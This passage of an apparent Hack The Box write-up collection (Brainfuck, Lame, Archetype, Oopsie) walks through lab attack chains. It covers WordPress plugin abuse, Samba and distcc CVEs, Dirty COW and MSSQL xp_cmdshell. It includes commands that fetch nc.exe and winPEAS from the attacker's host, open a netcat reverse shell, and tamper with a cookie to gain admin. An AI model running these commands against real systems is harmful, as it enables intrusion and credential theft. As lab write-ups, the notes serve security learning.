value=\"Login\"&gt;\n&lt;/form&gt;\n</code></pre> <ul> <li>click login and capture packet to see admin-cookie setted</li> </ul> <ul> <li>visit admin page as admin priv</li> </ul> <ul> <li>try to get a shell (no writing permission)</li> <li>editor theme tamplete php file (rce) [x]</li> <li>upload a zip file to add new plugin [x]</li> </ul> <ul> <li>what's left in attack vector [?] -&gt; email service</li> <li>check wp email plugin</li> </ul>"},{"location":"Write-ups/thb/linux/Brainfuck/#easy-wp-smtp","title":"easy wp smtp","text":"<p>user enum</p> <ul> <li>telnet</li> </ul> <p></p> <ul> <li>nmap scan</li> </ul> <p></p> <ul> <li>smtp-user-enum (no user found, strange)</li> </ul> <p></p> <p>setting in wp admin page</p> <p></p> <p>2 methods to get SMTP password:</p> <ol> <li>check html source</li> </ol> <p></p> <ol> <li> <p>set SMTP host to local ip and send test email to local while capturing the packet to get the password</p> </li> <li> <p>start a SMTP service, listening to 25 port</p> </li> </ol> <p></p> <ul> <li>capture packages from 25 port using tshark, <code>sudo tshark -ni tun0 tcp port 25</code></li> </ul> <p></p> <ul> <li>get password</li> </ul> <p></p>"},{"location":"Write-ups/thb/linux/Brainfuck/#143-imap-internal-mails","title":"143 - imap - internal mails","text":"<p>use <code>mutt</code> to connect to remote imap service</p> <ul> <li>edit config file <code>~/.muttrc</code></li> </ul> <p></p> <ul> <li><code>mutt</code> to conn and enum mails</li> </ul> <p></p> <p></p> <ul> <li>cred: orestis:kIEnnfEKJ#9UmdO</li> </ul>"},{"location":"Write-ups/thb/linux/Brainfuck/#443-subdomain-sup3rs3cr3t","title":"443 - subdomain sup3rs3cr3t","text":"<ul> <li>forum site</li> </ul> <ul> <li>use password from wp smtp plugin [x], password from imap mails [y]<ul> <li>orestis:kIEnnfEKJ#9UmdO</li> </ul> </li> </ul> <ul> <li>information gathering:<ul> <li>ssh login, password is not allowed; orestis open a encrypted talk with admin<ul> <li>encrypted talk should be decrypted</li> </ul> </li> </ul> </li> </ul> <ul> <li> <p>encrypted words -&gt; Caesar cipher [x] -&gt; The Vigen\u00e8re Cipher Encryption and Decryption (mtu.edu)</p> </li> <li> <p>find an interesting sentence with clear original text</p> </li> </ul> <pre><code>Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg\nmnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja\n=&gt;\nhttps://brainfuck.htb/\n</code></pre> <ul> <li>crack procedure:</li> </ul> <p></p> <pre><code>h -&gt; m -&gt; f\nt -&gt; n -&gt; u\nt -&gt; v -&gt; c\np -&gt; z -&gt; k\ns -&gt; e -&gt; m\nb -&gt; z -&gt; y\nr -&gt; s -&gt; b\na -&gt; r -&gt; r\ni -&gt; i -&gt; a\nn -&gt; v -&gt; i\nf -&gt; s -&gt; n\nu -&gt; z -&gt; f\nc -&gt; w -&gt; u\nk -&gt; m -&gt; c\n.\nh -&gt; r -&gt; k\nt -&gt; f -&gt; m\nb -&gt; z -&gt; y\n</code></pre> <ul> <li>the key of Vigen\u00e8re Cipher Encryption: fuckmybrain</li> <li>decrypted all sentences:</li> </ul> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>collect id_rsa file for user orestis (https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa) and brute force to get passphrases by <code>ssh2john</code>, <code>john</code></li> </ul> <p></p> <ul> <li>cred: orestis:3poulakia!</li> </ul> <p></p>"},{"location":"Write-ups/thb/linux/Brainfuck/#privilege-escalation","title":"Privilege Escalation","text":"<p>orestis privilege enum:</p> <ul> <li>no sudo</li> <li>no suid, guid</li> <li>no scheduled tasks</li> <li>find interesting files: debug.txt, output.txt, encrypt.sage</li> </ul> <p></p> <ul> <li>rsa encryption with p, q, e given -&gt; have encrtped c -&gt; calculate orginal m</li> <li>use sage script to decrypt, RSA - Decryption - Given p, q and e - Calculate m(message) from c(cipher text) - Algorithm: Extended Euclidean - sage @ zhsh 2023 (github.com) -&gt; get root flag</li> </ul> <p></p>"},{"location":"Write-ups/thb/linux/Brainfuck/#exploit-chain","title":"Exploit Chain","text":"<p>wp support plugin exp to login as admin -&gt; easy wp smtp plugin to get smtp username and password -&gt; conn imap remote service to seek secret forum password from internal emails -&gt; Vigen\u00e8re cipher decryption to download id_rsa file and hint of brute forcing passphrase -&gt; john to crack passphrase -&gt; foothold orestis using ssh -&gt; find encryption of root flag program and debug+output file -&gt; decrypt m(root flag) using p, q, e, c</p>"},{"location":"Write-ups/thb/linux/Lame/","title":"Lame","text":""},{"location":"Write-ups/thb/linux/Lame/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/thb/linux/Lame/#recon","title":"Recon","text":"<pre><code>PORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to 10.10.14.15\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey:\n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open              Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.23 (92%), DD-WRT v24-sp1 (Linux 2.4.36) (90%), Arris TG862G/CT cable modem (90%), Belkin N300 WAP (Linux 2.6.30) (90%), Control4 HC-300 home controller (90%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (90%), Dell Integrated Remote Access Controller (iDRAC6) (90%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (90%), Linux 2.4.21 - 2.4.31 (likely embedded) (90%), Linux 2.4.27 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb-os-discovery:\n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name:\n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2023-11-26T16:50:30-05:00\n|_smb2-time: Protocol negotiation failed (SMB2)\n|_clock-skew: mean: 2h30m26s, deviation: 3h32m11s, median: 23s\n</code></pre> <ul> <li>attack vector: 21 vsftpd -&gt; backdoor, 139 smb -&gt; file leakage, smb cve, 3632 distccd</li> </ul>"},{"location":"Write-ups/thb/linux/Lame/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/linux/Lame/#21-ftp","title":"21 ftp","text":"<p>nothing as anonymous</p>"},{"location":"Write-ups/thb/linux/Lame/#139-smb","title":"139 smb","text":""},{"location":"Write-ups/thb/linux/Lame/#enum","title":"enum","text":"<ul> <li>Samba smbd 3.X - 4.X</li> <li>disks, nothing found [x]</li> </ul>"},{"location":"Write-ups/thb/linux/Lame/#cve-yes","title":"cve ? -&gt; yes","text":"<p>CVE-2007-2447, useful script: -&gt; root</p> <ul> <li>Alien0ne/CVE-2007-2447: CVE-2007-2447 - Samba usermap script (github.com)</li> <li>Ziemni/CVE-2007-2447-in-Python: Python implementation of 'Username' map script' RCE Exploit for Samba 3.0.20 &lt; 3.0.25rc3 (CVE-2007-2447). (github.com)</li> </ul> <p></p>"},{"location":"Write-ups/thb/linux/Lame/#3632-distccd","title":"3632 distccd","text":"<p><code>distcc</code> is a program designed to speed up the compilation of code by distributing the task across several machines on a network. The <code>distcc</code> system consists of a client and a number of server machines. The client sends parts of the compilation job to the servers, which compile the parts and send them back to the client.</p> <p><code>distccd</code> is the server daemon for the <code>distcc</code> distributed compiler system. It listens for connections from <code>distcc</code> clients and performs compilations on behalf of them.</p> <ul> <li>searchsploit</li> </ul> <p></p> <ul> <li>nmap script scan</li> </ul> <p></p> <ul> <li>CVE-2004-2687, get a daemon priv shell -&gt; user.txt ok</li> </ul> <p></p>"},{"location":"Write-ups/thb/linux/Lame/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/linux/Lame/#smb-cve","title":"smb cve","text":"<p>CVE-2007-2447</p>"},{"location":"Write-ups/thb/linux/Lame/#daemon-root","title":"daemon -&gt; root","text":"<ul> <li>old version linux -&gt; kernel exp</li> <li>searchsploit -&gt; 40839 -&gt; Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) - Linux local Exploit (exploit-db.com) -&gt; CVE-2016-5195</li> </ul> <ul> <li>exp:</li> </ul> <pre><code>gcc dirty.c -pthread -o dirty -lcrypt, ./dirty qwe\nssh -oHostKeyAlgorithms=+ssh-rsa firefart@10.10.10.3\n</code></pre>"},{"location":"Write-ups/thb/linux/Lame/#exploit-chain","title":"Exploit Chain","text":"<ul> <li>method1: recon -&gt; smb -&gt; CVE-2007-2447 -&gt; root shell</li> <li>method2: recon -&gt; distcc -&gt; daemon-priv shell -&gt; CVE-2016-5195 -&gt; root shell</li> </ul>"},{"location":"Write-ups/thb/linux/Shocker/","title":"Shocker","text":""},{"location":"Write-ups/thb/linux/Shocker/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/thb/linux/Shocker/#recon","title":"Recon","text":""},{"location":"Write-ups/thb/linux/Shocker/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/linux/Shocker/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/linux/Shocker/#exploit-chain","title":"Exploit Chain","text":""},{"location":"Write-ups/thb/starting_point/Archetype/","title":"Archetype","text":""},{"location":"Write-ups/thb/starting_point/Archetype/#machine-info","title":"Machine Info","text":"<p>Tags</p> <p>Network, Protocols, MSSQL, SMB, Impacket, Powershell, Reconnaissance, Remote Code Execution, Clear Text Credentials, Information Disclosure, Anonymous/Guest Access</p>"},{"location":"Write-ups/thb/starting_point/Archetype/#recon","title":"Recon","text":"<ul> <li><code>$ cat nmap/detail.nmap</code> <pre><code># Nmap 7.94 scan initiated Tue Nov 21 06:53:44 2023 as: nmap -sT -sV -sC -O -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -oA nmap/detail 10.129.219.154\nNmap scan report for 10.129.219.154\nHost is up (0.26s latency).\n\nPORT      STATE SERVICE     VERSION\n135/tcp   open  msrpc       Microsoft Windows RPC\n139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn\n445/tcp   open  0\u043fU      Windows Server 2019 Standard 17763 microsoft-ds\n1433/tcp  open  ms-sql-s    Microsoft SQL Server 2017 14.00.1000.00; RTM\n| ms-sql-info:\n|   10.129.219.154:1433:\n|     Version:\n|       name: Microsoft SQL Server 2017 RTM\n|       number: 14.00.1000.00\n|       Product: Microsoft SQL Server 2017\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2023-11-20T22:51:49\n|_Not valid after:  2053-11-20T22:51:49\n|_ssl-date: 2023-11-20T22:58:22+00:00; +3m17s from scanner time.\n| ms-sql-ntlm-info:\n|   10.129.219.154:1433:\n|     Target_Name: ARCHETYPE\n|     NetBIOS_Domain_Name: ARCHETYPE\n|     NetBIOS_Computer_Name: ARCHETYPE\n|     DNS_Domain_Name: Archetype\n|     DNS_Computer_Name: Archetype\n|_    Product_Version: 10.0.17763\n5985/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc       Microsoft Windows RPC\n49665/tcp open  msrpc       Microsoft Windows RPC\n49666/tcp open  msrpc       Microsoft Windows RPC\n49667/tcp open  msrpc       Microsoft Windows RPC\n49668/tcp open  msrpc       Microsoft Windows RPC\n49669/tcp open  msrpc       Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n</code></pre></li> </ul> <p>find two main services: - 445 smb - 1433 mssql</p>"},{"location":"Write-ups/thb/starting_point/Archetype/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/starting_point/Archetype/#smb-backup-leakage","title":"smb backup leakage","text":"<pre><code>$ cat prod.dtsConfig\n&lt;DTSConfiguration&gt;\n    &lt;DTSConfigurationHeading&gt;\n        &lt;DTSConfigurationFileInfo GeneratedBy=\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/&gt;\n    &lt;/DTSConfigurationHeading&gt;\n    &lt;Configuration ConfiguredType=\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\"&gt;\n        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;\n    &lt;/Configuration&gt;\n&lt;/DTSConfiguration&gt;\n</code></pre> <p>SQLNCLI10 cred:</p> <ul> <li>ARCHETYPE(domain)\\sql_svc(user):M3g4c0rp123(password)</li> </ul>"},{"location":"Write-ups/thb/starting_point/Archetype/#mssql","title":"mssql","text":"<ul> <li><code>impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@$IP -windows-auth</code>, windows-auth option cannot be missing</li> </ul> <pre><code>Impacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.\n[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)\n[!] Press help for extra shell commands\nSQL (ARCHETYPE\\sql_svc  dbo@master)&gt; EXEC xp_cmdshell 'dir C:\\';\n[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.\n</code></pre> <ul> <li>enbale xp_cmdshell in mssql</li> </ul> <pre><code>SQL (ARCHETYPE\\sql_svc  dbo@master)&gt; EXEC sp_configure 'show advanced options', 1;\n[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\nSQL (ARCHETYPE\\sql_svc  dbo@master)&gt; RECONFIGURE;\nSQL (ARCHETYPE\\sql_svc  dbo@master)&gt; EXEC sp_configure 'xp_cmdshell', 1;\n[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\nSQL (ARCHETYPE\\sql_svc  dbo@master)&gt; RECONFIGURE;\nSQL (ARCHETYPE\\sql_svc  dbo@master)&gt; EXEC xp_cmdshell 'dir C:\\';\noutput\n----------------------------------------------------------\n Volume in drive C has no label.\n\n Volume Serial Number is 9565-0B4F\n\nNULL\n\n Directory of C:\\\n\nNULL\n\n01/20/2020  04:20 AM    &lt;DIR&gt;          backups\n\n07/27/2021  01:28 AM    &lt;DIR&gt;          PerfLogs\n\n07/27/2021  02:20 AM    &lt;DIR&gt;          Program Files\n\n07/27/2021  02:20 AM    &lt;DIR&gt;          Program Files (x86)\n\n01/19/2020  10:39 PM    &lt;DIR&gt;          Users\n\n07/27/2021  02:22 AM    &lt;DIR&gt;          Windows\n\n               0 File(s)              0 bytes\n\n               6 Dir(s)  10,723,508,224 bytes free\n\nNULL\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Archetype/#get-a-shell-from-mssql","title":"get a shell from mssql","text":"<ul> <li>download nc.exe from local machine</li> </ul> <pre><code>SQL (ARCHETYPE\\sql_svc  dbo@master)&gt; EXEC xp_cmdshell 'powershell -c cd; curl http://10.10.15.98/nc64.exe -O c:\\Users\\sql_svc\\Downloads\\nc.exe'\noutput\n------\nNULL\n\nSQL (ARCHETYPE\\sql_svc  dbo@master)&gt; EXEC xp_cmdshell 'dir c:\\Users\\sql_svc\\Downloads\\'\noutput\n--------------------------------------------------\n Volume in drive C has no label.\n\n Volume Serial Number is 9565-0B4F\n\nNULL\n\n Directory of c:\\Users\\sql_svc\\Downloads\n\nNULL\n\n11/20/2023  04:52 PM    &lt;DIR&gt;          .\n\n11/20/2023  04:52 PM    &lt;DIR&gt;          ..\n\n11/20/2023  04:52 PM            45,272 nc.exe\n\n               1 File(s)         45,272 bytes\n\n               2 Dir(s)  10,721,443,840 bytes free\n\nNULL\n</code></pre> <ul> <li>use nc to start a rshell</li> </ul> <pre><code>SQL (ARCHETYPE\\sql_svc  dbo@master)&gt; EXEC xp_cmdshell \u2018c:\\Users\\sql_svc\\Downloads\\nc.exe 10.10.15.98 1234 -e cmd.exe\u2019\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Archetype/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/starting_point/Archetype/#enumeration","title":"enumeration","text":"<ul> <li>curl winPEAS from local machine</li> </ul> <pre><code>C:\\Users\\sql_svc\\Downloads&gt;curl -O http://10.10.15.98/winPEAS.bat\ncurl -O http://10.10.15.98/winPEAS.bat\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 36177  100 36177    0     0  36177      0  0:00:01 --:--:--  0:00:01 42863\n\nC:\\Users\\sql_svc\\Downloads&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 9565-0B4F\n\n Directory of C:\\Users\\sql_svc\\Downloads\n\n11/20/2023  04:56 PM    &lt;DIR&gt;          .\n11/20/2023  04:56 PM    &lt;DIR&gt;          ..\n11/20/2023  04:52 PM            45,272 nc.exe\n11/20/2023  04:56 PM            36,177 winPEAS.bat\n               2 File(s)         81,449 bytes\n               2 Dir(s)  10,721,406,976 bytes free\n</code></pre> <ul> <li>execute winPEAS and check output, finding potential creds from possible files</li> </ul> <pre><code> [+] Files in registry that may contain credentials\n   [i] Searching specific files that may contains credentials.\n   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files\nLooking inside HKCU\\Software\\ORL\\WinVNC3\\Password\nLooking inside HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4/password\nLooking inside HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\WinLogon\n    DefaultDomainName    REG_SZ\n    DefaultUserName    REG_SZ\nLooking inside HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\nLooking inside HKCU\\Software\\TightVNC\\Server\nLooking inside HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\nLooking inside HKCU\\Software\\OpenSSH\\Agent\\Keys\nC:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nC:\\Windows\\Panther\\setupinfo\nC:\\Windows\\servicing\\LCU\\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.2061.1.7\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_f6f6520641f6caff\\f\\appcmd.exe\nC:\\Windows\\servicing\\LCU\\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.2061.1.7\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_f6f6520641f6caff\\r\\appcmd.exe\nC:\\Windows\\servicing\\LCU\\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.2061.1.7\\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_014afc5876578cfa\\f\\appcmd.exe\nC:\\Windows\\servicing\\LCU\\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.2061.1.7\\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_014afc5876578cfa\\r\\appcmd.exe\nC:\\Windows\\WinSxS\\amd64_ipamprov-dcnps_31bf3856ad364e35_10.0.17763.1_none_90fd9849ea1e4266\\ScheduledTasks.xml\nC:\\Windows\\WinSxS\\amd64_ipamprov-dhcp_31bf3856ad364e35_10.0.17763.1_none_64f02b544b2506ef\\ScheduledTasks.xml\nC:\\Windows\\WinSxS\\amd64_ipamprov-dns_31bf3856ad364e35_10.0.17763.1_none_825235baef207c8d\\ScheduledTasks.xml\nC:\\Windows\\WinSxS\\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_10.0.17763.1_none_8bd0f81f9b897a08\\ntds.dit\nC:\\Windows\\WinSxS\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_f6f6520641f6caff\\appcmd.exe\nC:\\Windows\\WinSxS\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1_none_9a517574c8380381\\appcmd.exe\nC:\\Windows\\WinSxS\\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_10.0.17763.1_en-us_742f5bf0baaff2c7\\certnew.cer\nC:\\Windows\\WinSxS\\wow64_ipamprov-dcnps_31bf3856ad364e35_10.0.17763.1_none_9b52429c1e7f0461\\ScheduledTasks.xml\nC:\\Windows\\WinSxS\\wow64_ipamprov-dhcp_31bf3856ad364e35_10.0.17763.1_none_6f44d5a67f85c8ea\\ScheduledTasks.xml\nC:\\Windows\\WinSxS\\wow64_ipamprov-dns_31bf3856ad364e35_10.0.17763.1_none_8ca6e00d23813e88\\ScheduledTasks.xml\nC:\\Windows\\WinSxS\\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_014afc5876578cfa\\appcmd.exe\nC:\\Windows\\WinSxS\\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1_none_a4a61fc6fc98c57c\\appcmd.exe\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Archetype/#high-priv-creds","title":"high-priv creds","text":"<ul> <li><code>C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code></li> </ul> <pre><code>C:\\Windows\\system32&gt;type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nnet.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!!\nexit\n</code></pre> <ul> <li><code>administrator:MEGACORP_4dm1n!!</code></li> <li>connect as admin using evil-winrm or psexec</li> </ul> <pre><code>$ impacket-psexec administrator@$IP\n$ evil-winrm -i $IP -u Administrator\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Oopsie/","title":"Oopsie","text":""},{"location":"Write-ups/thb/starting_point/Oopsie/#machine-info","title":"Machine Info","text":"<p>Tags:</p> <p>PHP, Web, Custom Applications, Session Handling, Apache, Reconnaissance, Web Site Structure Discovery, Cookie Manipulation, SUID Exploitation, Authentication bypass, Clear Text Credentials, Arbitrary File Upload, Insecure Direct Object Reference (IDOR), Path Hijacking</p>"},{"location":"Write-ups/thb/starting_point/Oopsie/#recon","title":"Recon","text":""},{"location":"Write-ups/thb/starting_point/Oopsie/#port-and-service-scan","title":"port and service scan","text":"<ul> <li><code>sudo nmap -sT -sV -sC -O -p22,80,139,445 $IP -oA nmap/detail</code></li> </ul> <pre><code># Nmap 7.94 scan initiated Tue Nov 21 21:07:51 2023 as: nmap -sT -sV -sC -O -p 22,80 -oA nmap/detail 10.129.95.191\nNmap scan report for 10.129.95.191\nHost is up (0.28s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)\n|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)\n|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Welcome\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Nov 21 21:08:13 2023 -- 1 IP address (1 host up) scanned in 22.19 seconds\n</code></pre> <ul> <li>find two services: 22ssh, 80http</li> <li>some info</li> </ul> <pre><code>MegaCorp, CodePen\nadmin@megacorp.com\n+44 (0)123 456 789\nUbuntu - Apache - PHP\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Oopsie/#http-path-scan","title":"http path scan","text":"<ul> <li><code>$ gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></li> </ul> <pre><code>===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.129.95.191\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/images/]\n/themes               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/themes/]\n/uploads              (Status: 301) [Size: 316] [--&gt; http://10.129.95.191/uploads/]\n/css                  (Status: 301) [Size: 312] [--&gt; http://10.129.95.191/css/]\n/js                   (Status: 301) [Size: 311] [--&gt; http://10.129.95.191/js/]\n/fonts                (Status: 301) [Size: 314] [--&gt; http://10.129.95.191/fonts/]\n</code></pre> <ul> <li><code>$IP/uploads/</code> is a directory for server to collect uploaded files</li> <li>find login page by burp: <code>http://10.129.95.191/cdn-cgi/login/</code></li> </ul>"},{"location":"Write-ups/thb/starting_point/Oopsie/#foothold","title":"Foothold","text":"<ul> <li>Guest login -&gt; admin id (<code>http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code>)</li> </ul> <pre><code>Access ID   Name    Email\n34322       admin   admin@megacorp.com\n2233        guest   guest@megacorp.com\n</code></pre> <ul> <li>manage the admin cookie for visiting this server</li> </ul> <pre><code>collect cookie structure:\n            {\n                \"name\": \"Cookie\",\n                \"value\": \"user=2233; role=guest\" -&gt; \"user=34322; role=admin\"\n            },\n</code></pre> <ul> <li>find the upload exp -&gt; upload rshell.php -&gt; visit it to execute rshell</li> </ul> <ul> <li>POC: upload file exp</li> </ul> <ul> <li>upload a shell and get a shell</li> </ul>"},{"location":"Write-ups/thb/starting_point/Oopsie/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/starting_point/Oopsie/#www-robert","title":"www-&gt;robert","text":"<ul> <li>enumeration</li> </ul> <pre><code>$ uname -a\nLinux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n$ cat 